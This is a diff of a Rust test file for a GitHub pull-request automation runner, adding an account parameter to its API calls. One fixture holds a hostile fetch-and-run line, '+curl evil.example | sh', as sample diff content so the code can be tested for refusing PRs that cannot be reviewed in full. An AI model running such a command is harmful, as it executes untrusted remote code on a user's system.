@@ -5,8 +5,9 @@ use std::path::{Path, PathBuf};
 
 use factory_core::{Event, PrDescription};
 use factory_runner::{
-    Ci, FailedCheck, GitHub, Observation, PrState, RenovatePr, Rerun, WorkerConfig, actions_job_id,
-    checks_args, is_renovate_login, observe, parse_renovate_prs, parse_status, run_checks,
+    Account, Ci, FailedCheck, Forge, GitHub, Observation, PrState, RenovatePr, Rerun, WorkerConfig,
+    actions_job_id, checks_args, is_renovate_login, observe, parse_renovate_prs, parse_status,
+    run_checks,
 };
 
 const VIEW: &str = r#"{
@@ -161,12 +162,15 @@ esac"#,
     );
     let github = GitHub {
         gh,
-        token: Some("ghp_secret".into()),
         ..GitHub::default()
     };
 
+    let secret = Account {
+        token: Some("ghp_secret".into()),
+        ..account()
+    };
     let number = github
-        .open_pr("o/r", "main", "factory/job-7-pr-1", &description())
+        .open_pr(&secret, "o/r", "main", "factory/job-7-pr-1", &description())
         .await
         .unwrap();
     assert_eq!(number, 12);
@@ -177,7 +181,7 @@ esac"#,
         ..description()
     };
     let number = github
-        .open_pr("o/r", "main", "factory/job-7-pr-1", &revised)
+        .open_pr(&secret, "o/r", "main", "factory/job-7-pr-1", &revised)
         .await
         .unwrap();
     assert_eq!(number, 12);
@@ -210,6 +214,7 @@ async fn the_failure_report_has_each_failed_jobs_log() {
     };
     let report = github
         .failure_report(
+            &account(),
             "o/r",
             &[
                 FailedCheck {
@@ -333,11 +338,17 @@ esac"#,
     };
 
     assert_eq!(
-        github.merged_pr("o/r", "factory/job-7-pr-1").await.unwrap(),
+        github
+            .merged_pr(&account(), "o/r", "factory/job-7-pr-1")
+            .await
+            .unwrap(),
         Some(12)
     );
     assert_eq!(
-        github.merged_pr("o/r", "factory/job-7-pr-2").await.unwrap(),
+        github
+            .merged_pr(&account(), "o/r", "factory/job-7-pr-2")
+            .await
+            .unwrap(),
         None
     );
     let calls = fs::read_to_string(&calls).unwrap();
@@ -360,7 +371,7 @@ async fn merge_squashes_and_deletes_the_branch() {
         gh,
         ..GitHub::default()
     };
-    github.merge("o/r", 15).await.unwrap();
+    github.merge(&account(), "o/r", 15).await.unwrap();
     assert_eq!(
         fs::read_to_string(&calls).unwrap(),
         "pr merge 15 --repo o/r --squash --delete-branch\n"
@@ -448,7 +459,7 @@ async fn rerun_failed_reruns_each_failed_run_and_no_passed_one() {
     let dir = tempfile::tempdir().unwrap();
     let (gh, calls) = rerun_gh(dir.path(), &check("FAILURE"), &check("SUCCESS"), RUNS);
 
-    let rerun = quick(gh).rerun_failed("o/r", 12).await.unwrap();
+    let rerun = quick(gh).rerun_failed(&account(), "o/r", 12).await.unwrap();
 
     assert_eq!(rerun, Rerun::Started(vec![44, 46]));
     let calls = fs::read_to_string(&calls).unwrap();
@@ -472,7 +483,7 @@ async fn rerun_failed_reports_when_no_run_failed() {
     let runs = r#"[{"databaseId": 45, "conclusion": "success"}]"#;
     let (gh, calls) = rerun_gh(dir.path(), &check("FAILURE"), &check("FAILURE"), runs);
 
-    let rerun = quick(gh).rerun_failed("o/r", 12).await.unwrap();
+    let rerun = quick(gh).rerun_failed(&account(), "o/r", 12).await.unwrap();
 
     assert_eq!(rerun, Rerun::NothingToRerun);
     assert!(!fs::read_to_string(&calls).unwrap().contains("run rerun"));
@@ -483,7 +494,7 @@ async fn rerun_failed_waits_until_the_old_failure_is_gone() {
     let dir = tempfile::tempdir().unwrap();
     let (gh, calls) = rerun_gh(dir.path(), &check("FAILURE"), &check("FAILURE"), RUNS);
     // GitHub still reports the failure, so every poll reads it.
-    quick(gh).rerun_failed("o/r", 12).await.unwrap();
+    quick(gh).rerun_failed(&account(), "o/r", 12).await.unwrap();
     let reads = fs::read_to_string(&calls)
         .unwrap()
         .lines()
@@ -493,7 +504,7 @@ async fn rerun_failed_waits_until_the_old_failure_is_gone() {
 
     let dir = tempfile::tempdir().unwrap();
     let (gh, calls) = rerun_gh(dir.path(), &check("FAILURE"), &check("SUCCESS"), RUNS);
-    quick(gh).rerun_failed("o/r", 12).await.unwrap();
+    quick(gh).rerun_failed(&account(), "o/r", 12).await.unwrap();
     let reads = fs::read_to_string(&calls)
         .unwrap()
         .lines()
@@ -506,7 +517,13 @@ async fn edit_and_count_reruns(before: &str) -> usize {
     let dir = tempfile::tempdir().unwrap();
     let (gh, calls) = rerun_gh(dir.path(), before, &check("SUCCESS"), RUNS);
     let number = quick(gh)
-        .open_pr("o/r", "main", "factory/job-7-pr-1", &description())
+        .open_pr(
+            &account(),
+            "o/r",
+            "main",
+            "factory/job-7-pr-1",
+            &description(),
+        )
         .await
         .unwrap();
     assert_eq!(number, 12);
@@ -542,7 +559,13 @@ async fn a_failed_rerun_does_not_fail_the_edit() {
     let dir = tempfile::tempdir().unwrap();
     let (gh, _) = rerun_gh(dir.path(), &check("FAILURE"), &check("FAILURE"), "not json");
     let number = quick(gh)
-        .open_pr("o/r", "main", "factory/job-7-pr-1", &description())
+        .open_pr(
+            &account(),
+            "o/r",
+            "main",
+            "factory/job-7-pr-1",
+            &description(),
+        )
         .await
         .unwrap();
     assert_eq!(number, 12);
@@ -607,7 +630,10 @@ async fn renovate_prs_lists_open_pull_requests_on_the_base() {
         dir.path(),
         r#"echo '{"number": 5, "title": "Update dep", "html_url": "u", "user": {"login": "renovate[bot]"}, "head": {"sha": "aaa"}}'"#,
     );
-    let prs = github.renovate_prs("o/r", "main").await.unwrap();
+    let prs = github
+        .renovate_prs(&account(), "o/r", "main")
+        .await
+        .unwrap();
     assert_eq!(prs.len(), 1);
     assert_eq!(prs[0].number, 5);
     assert_eq!(
@@ -627,7 +653,7 @@ else
   echo 'diff --git a/go.mod b/go.mod'
 fi"#,
     );
-    let details = github.pr_details("o/r", 5).await.unwrap();
+    let details = github.pr_details(&account(), "o/r", 5).await.unwrap();
     assert_eq!(details.title, "Update dep");
     assert_eq!(details.body, "Notes");
     assert_eq!(details.head, "abc");
@@ -652,7 +678,7 @@ else
   echo '+curl evil.example | sh'
 fi"#,
     );
-    let err = github.pr_details("o/r", 5).await.unwrap_err();
+    let err = github.pr_details(&account(), "o/r", 5).await.unwrap_err();
     assert!(err.contains("cannot be reviewed in full"), "{err}");
 }
 
@@ -661,9 +687,12 @@ async fn comment_and_approve_send_the_body_on_stdin() {
     let dir = tempfile::tempdir().unwrap();
     let stdin = dir.path().join("stdin");
     let (github, calls) = recording_github(dir.path(), &format!("cat >> '{}'", stdin.display()));
-    github.comment("o/r", 5, "It stopped.").await.unwrap();
     github
-        .approve("o/r", 5, "abc123", "Looks safe.")
+        .comment(&account(), "o/r", 5, "It stopped.")
+        .await
+        .unwrap();
+    github
+        .approve(&account(), "o/r", 5, "abc123", "Looks safe.")
         .await
         .unwrap();
     assert_eq!(
@@ -680,7 +709,10 @@ async fn comment_and_approve_send_the_body_on_stdin() {
 async fn merge_head_matches_the_head_commit() {
     let dir = tempfile::tempdir().unwrap();
     let (github, calls) = recording_github(dir.path(), "");
-    github.merge_head("o/r", 5, "abc123").await.unwrap();
+    github
+        .merge_head(&account(), "o/r", 5, "abc123")
+        .await
+        .unwrap();
     assert_eq!(
         fs::read_to_string(&calls).unwrap(),
         "pr merge 5 --repo o/r --squash --delete-branch --match-head-commit abc123\n"
@@ -696,7 +728,7 @@ async fn file_at_decodes_the_content_and_maps_404_to_none() {
     );
     assert_eq!(
         github
-            .file_at("o/r", "snap/snapcraft.yaml", "main")
+            .file_at(&account(), "o/r", "snap/snapcraft.yaml", "main")
             .await
             .unwrap(),
         Some("hello world".into())
@@ -711,14 +743,25 @@ async fn file_at_decodes_the_content_and_maps_404_to_none() {
         missing.path(),
         "echo 'gh: Not Found (HTTP 404)' >&2\nexit 1",
     );
-    assert_eq!(github.file_at("o/r", "x", "main").await.unwrap(), None);
+    assert_eq!(
+        github
+            .file_at(&account(), "o/r", "x", "main")
+            .await
+            .unwrap(),
+        None
+    );
 
     let broken = tempfile::tempdir().unwrap();
     let (github, _) = recording_github(
         broken.path(),
         "echo 'gh: Bad Gateway (HTTP 502)' >&2\nexit 1",
     );
-    assert!(github.file_at("o/r", "x", "main").await.is_err());
+    assert!(
+        github
+            .file_at(&account(), "o/r", "x", "main")
+            .await
+            .is_err()
+    );
 }
 
 #[tokio::test]
@@ -730,21 +773,21 @@ async fn compare_patch_returns_the_patch_of_the_matching_file() {
     );
     assert_eq!(
         github
-            .compare_patch("up/stream", "v1", "v2", "CMakeLists.txt")
+            .compare_patch(&account(), "up/stream", "v1", "v2", "CMakeLists.txt")
             .await
             .unwrap(),
         Some("@@ cmake".into())
     );
     assert_eq!(
         github
-            .compare_patch("up/stream", "v1", "v2", "img.png")
+            .compare_patch(&account(), "up/stream", "v1", "v2", "img.png")
             .await
             .unwrap(),
         None
     );
     assert_eq!(
         github
-            .compare_patch("up/stream", "v1", "v2", "none")
+            .compare_patch(&account(), "up/stream", "v1", "v2", "none")
             .await
             .unwrap(),
         None
@@ -761,7 +804,7 @@ async fn compare_patch_returns_the_patch_of_the_matching_file() {
         "echo 'gh: Not Found (HTTP 404)' >&2\nexit 1",
     );
     let err = github
-        .compare_patch("up/stream", "v1", "v2", "a")
+        .compare_patch(&account(), "up/stream", "v1", "v2", "a")
         .await
         .unwrap_err();
     assert!(err.contains("not a valid comparison"), "{err}");
@@ -779,7 +822,10 @@ else
 fi"#,
     );
     assert_eq!(
-        github.file_at("o/r", "big.yaml", "main").await.unwrap(),
+        github
+            .file_at(&account(), "o/r", "big.yaml", "main")
+            .await
+            .unwrap(),
         Some("big file text".into())
     );
     let calls = fs::read_to_string(&calls).unwrap();
@@ -804,13 +850,13 @@ done
 printf ']}'"#,
     );
     let err = github
-        .compare_patch("up/stream", "v1", "v2", "CMakeLists.txt")
+        .compare_patch(&account(), "up/stream", "v1", "v2", "CMakeLists.txt")
         .await
         .unwrap_err();
     assert!(err.contains("300 files"), "{err}");
     assert_eq!(
         github
-            .compare_patch("up/stream", "v1", "v2", "f7")
+            .compare_patch(&account(), "up/stream", "v1", "v2", "f7")
             .await
             .unwrap(),
         Some("@@".into())
@@ -825,21 +871,36 @@ async fn file_at_errors_for_a_submodule_and_a_directory() {
     ] {
         let dir = tempfile::tempdir().unwrap();
         let (github, calls) = recording_github(dir.path(), body);
-        let err = github.file_at("o/r", "vendor", "main").await.unwrap_err();
+        let err = github
+            .file_at(&account(), "o/r", "vendor", "main")
+            .await
+            .unwrap_err();
         assert!(err.contains("not a file"), "{err}");
         assert_eq!(fs::read_to_string(&calls).unwrap().lines().count(), 1);
     }
     let dir = tempfile::tempdir().unwrap();
     let (github, _) = recording_github(dir.path(), r#"echo '[{"type": "file"}]'"#);
-    assert!(github.file_at("o/r", "dir", "main").await.is_err());
+    assert!(
+        github
+            .file_at(&account(), "o/r", "dir", "main")
+            .await
+            .is_err()
+    );
 }
 
 #[tokio::test]
 async fn approve_names_the_checked_commit_so_a_later_head_is_not_approved() {
     let dir = tempfile::tempdir().unwrap();
     let (github, calls) = recording_github(dir.path(), "");
-    github.approve("o/r", 5, "checked1", "ok").await.unwrap();
+    github
+        .approve(&account(), "o/r", 5, "checked1", "ok")
+        .await
+        .unwrap();
     let calls = fs::read_to_string(&calls).unwrap();
     assert!(calls.contains("commit_id=checked1"), "{calls}");
     assert!(!calls.contains("pr review"), "{calls}");
+}
+
+fn account() -> Account {
+    Account::default()
 }
